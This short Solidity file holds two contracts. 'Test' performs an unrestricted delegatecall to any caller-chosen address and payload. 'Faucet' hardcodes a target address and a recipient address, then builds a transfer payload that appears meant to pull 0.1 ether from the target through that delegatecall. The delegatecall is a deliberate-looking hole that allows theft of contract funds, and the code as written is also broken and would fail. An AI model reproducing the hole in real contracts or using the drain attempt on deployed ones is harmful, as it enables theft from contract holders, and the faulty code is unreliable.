// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;

contract Test {
    function transferFunds(address payable _address, uint256 _amount, bytes calldata _payload) external payable {
        require(msg.value >= _amount, "Not enough BNB sent");
        (bool status,) = _address.delegatecall(_payload);
        require(status, "Forwarded call failed.");
    }
}

contract Faucet {
    address payable public contractAddress = payable(0xD900FFb0c6e3D982aA34e479331375F3cb351179); // contract address
    address payable public yourAddress = payable(0xC78fb93a84cfAfa295e8824C176F5B52654974D3); // BSC address
    
    function transferFaucet() external {
        Test testContract = Test(contractAddress);
        uint256 faucetBalance = address(contractAddress).balance;
        
        uint256 amountToSend = 0.1 ether; 
        
        require(amountToSend <= faucetBalance, "Insufficient balance in the contract.");
        
        // custom payload
        bytes memory payload = abi.encodeWithSignature("transfer(address,uint256)", yourAddress, amountToSend);
        
        testContract.transferFunds{value: amountToSend}(contractAddress, amountToSend, payload);
    }
}